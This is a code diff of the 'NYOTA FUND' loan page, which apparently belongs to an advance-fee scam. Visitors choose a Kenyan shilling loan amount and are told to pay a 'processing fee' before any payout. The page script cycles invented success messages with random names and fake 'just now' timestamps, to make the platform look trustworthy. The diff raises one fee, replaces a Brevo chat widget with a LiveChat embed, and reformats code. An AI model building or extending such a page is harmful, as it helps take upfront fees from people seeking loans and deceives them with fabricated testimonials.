@@ -1,25 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
- <!-- Brevo Conversations {literal} -->
-<script>
-    (function(d, w, c) {
-        w.BrevoConversationsID = '6973a340153840fff105d60b';
-        w[c] = w[c] || function() {
-            (w[c].q = w[c].q || []).push(arguments);
-        };
-        var s = d.createElement('script');
-        s.async = true;
-        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
-        if (d.head) d.head.appendChild(s);
-    })(document, window, 'BrevoConversations');
-</script>
-<!-- /Brevo Conversations {/literal} -->
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>NYOTA FUND – Amount Selection</title>
+<!-- Removed Brevo Conversations code for live chat integration -->
 
-  <link rel="stylesheet" href="style.css">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>NYOTA FUND – Amount Selection</title>
+  <link rel="stylesheet" href="style.css" />
 
   <!-- Firebase -->
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
@@ -69,26 +56,26 @@
 
   <!-- Amount buttons -->
   <div class="fund-buttons">
-  <button data-amount="22000" data-fee="5">Ksh 22,000</button>
-  <button data-amount="32300" data-fee="290">Ksh 32,300</button>
-  <button data-amount="43800" data-fee="330">Ksh 43,800</button>
-  <button data-amount="50000" data-fee="410">Ksh 50,000</button>
-  <button data-amount="93300" data-fee="490">Ksh 93,300</button>
-  <button data-amount="102000" data-fee="545">Ksh 102,000</button>
-  <button data-amount="150000" data-fee="600">Ksh 150,000</button>
-  <button data-amount="200000" data-fee="685">Ksh 200,000</button>
-  <button data-amount="220000" data-fee="710">Ksh 220,000</button>
-</div>
+    <button data-amount="22000" data-fee="240">Ksh 22,000</button>
+    <button data-amount="32300" data-fee="290">Ksh 32,300</button>
+    <button data-amount="43800" data-fee="330">Ksh 43,800</button>
+    <button data-amount="50000" data-fee="410">Ksh 50,000</button>
+    <button data-amount="93300" data-fee="490">Ksh 93,300</button>
+    <button data-amount="102000" data-fee="545">Ksh 102,000</button>
+    <button data-amount="150000" data-fee="600">Ksh 150,000</button>
+    <button data-amount="200000" data-fee="685">Ksh 200,000</button>
+    <button data-amount="220000" data-fee="710">Ksh 220,000</button>
+  </div>
 
   <p style="font-size:20px; margin-top:15px;">
-  Amount to Receive:
-  <strong>Ksh <span id="selectedAmount">---</span></strong>
-</p>
+    Amount to Receive:
+    <strong>Ksh <span id="selectedAmount">---</span></strong>
+  </p>
 
-<p style="font-size:20px;">
-  It's Processing Fee:
-  <strong>Ksh <span id="processingFee">---</span></strong>
-</p>
+  <p style="font-size:20px;">
+    It's Processing Fee:
+    <strong>Ksh <span id="processingFee">---</span></strong>
+  </p>
 
   <button onclick="continueToPayment()">Continue to Payment</button>
 
@@ -125,7 +112,7 @@
 // }
 
 let selectedFund = null;
- const savedFundRaw = localStorage.getItem("selectedFund");
+const savedFundRaw = localStorage.getItem("selectedFund");
 const savedFund = savedFundRaw ? JSON.parse(savedFundRaw) : null;
 
 if (savedFund) {
@@ -144,16 +131,13 @@ db.collection("users").doc(userPhone).get().then(doc => {
 
 document.querySelectorAll(".fund-buttons button").forEach(btn => {
   btn.addEventListener("click", () => {
-
     selectedFund = {
       amount: btn.dataset.amount,
       fee: btn.dataset.fee
     };
-
     // Show selected values
     document.getElementById("selectedAmount").innerText = selectedFund.amount;
     document.getElementById("processingFee").innerText = selectedFund.fee;
-
     // Save to localStorage
     localStorage.setItem("selectedFund", JSON.stringify(selectedFund));
   });
@@ -164,10 +148,8 @@ function continueToPayment() {
     alert("Please select amount first.");
     return;
   }
-
   // Save to localStorage
   localStorage.setItem("selectedFund", JSON.stringify(selectedFund));
-
   // Go to payment page
   window.location.href = "payment1.html";
 }
@@ -190,41 +172,41 @@ const names = [
 
 const messages = [
   "Just received 50k from NYOTA FUND! Thank you 🙏",
-"Thought it was a scam but got my 25k. So happy!",
-"Received 40k. Real and trusted platform 🙌",
-"Funds came in less than 3 minutes. Amazing!",
-"I top up my business with NYOTA FUND. Thanks!",
-"Very quick and reliable. Got 30k.",
-"I started my small business using 50k. Thank you!",
-"Payment was smooth, received 26,500.",
-"NYOTA FUND is trustworthy. Got my 38k.",
-"Amazing service, 46,850 received.",
-"Quick approval and fast fund delivery.",
-"Thought it was fake but got my money.",
-"12,300 received successfully. Thank you NYOTA FUND!",
-"Funds delivered faster than expected.",
-"Real platform, got 50k in my phone.",
-"My business top-up went through smoothly.",
-"NYOTA FUND is the real deal. 79,700 received.",
-"Funds helped pay my rent. Thank you!",
-"Quick processing, I received 106,500.",
-"Very satisfied with NYOTA FUND.",
-"Received my 38,100 in minutes.",
-"Started business and got 26,500.",
-"Funds legit, fast, and reliable.",
-"Happy to receive 46,850, thanks!",
-"NYOTA FUND never disappoints.",
-"50k received in record time.",
-"Platform is trustworthy. Funds received.",
-"I paid the processing fee and got my 12,300 instantly.",
-"Real platform, very satisfied.",
-"Received 79,700, helped me start my project."
+  "Thought it was a scam but got my 25k. So happy!",
+  "Received 40k. Real and trusted platform 🙌",
+  "Funds came in less than 3 minutes. Amazing!",
+  "I top up my business with NYOTA FUND. Thanks!",
+  "Very quick and reliable. Got 30k.",
+  "I started my small business using 50k. Thank you!",
+  "Payment was smooth, received 26,500.",
+  "NYOTA FUND is trustworthy. Got my 38k.",
+  "Amazing service, 46,850 received.",
+  "Quick approval and fast fund delivery.",
+  "Thought it was fake but got my money.",
+  "12,300 received successfully. Thank you NYOTA FUND!",
+  "Funds delivered faster than expected.",
+  "Real platform, got 50k in my phone.",
+  "My business top-up went through smoothly.",
+  "NYOTA FUND is the real deal. 79,700 received.",
+  "Funds helped pay my rent. Thank you!",
+  "Quick processing, I received 106,500.",
+  "Very satisfied with NYOTA FUND.",
+  "Received my 38,100 in minutes.",
+  "Started business and got 26,500.",
+  "Funds legit, fast, and reliable.",
+  "Happy to receive 46,850, thanks!",
+  "NYOTA FUND never disappoints.",
+  "50k received in record time.",
+  "Platform is trustworthy. Funds received.",
+  "I paid the processing fee and got my 12,300 instantly.",
+  "Real platform, very satisfied.",
+  "Received 79,700, helped me start my project."
 ];
 
 function timeAgo() {
   const times = [
-    "just now","2 seconds ago","10 seconds ago",
-    "30 seconds ago","1 minute ago","2 minutes ago","5 minutes ago"
+    "just now", "2 seconds ago", "10 seconds ago",
+    "30 seconds ago", "1 minute ago", "2 minutes ago", "5 minutes ago"
   ];
   return times[Math.floor(Math.random() * times.length)];
 }
@@ -265,5 +247,16 @@ setInterval(() => {
 }, 60);
 </script>
 
+<!-- Start of LiveChat (www.livechat.com) code -->
+<script>
+    window.__lc = window.__lc || {};
+    window.__lc.license = 19513072;
+    window.__lc.integration_name = "manual_channels";
+    window.__lc.product_name = "livechat";
+    (function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
+</script>
+<noscript><a href="https://www.livechat.com/chat-with/19513072/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
+<!-- End of LiveChat code -->
+
 </body>
-</html>
+     </html>
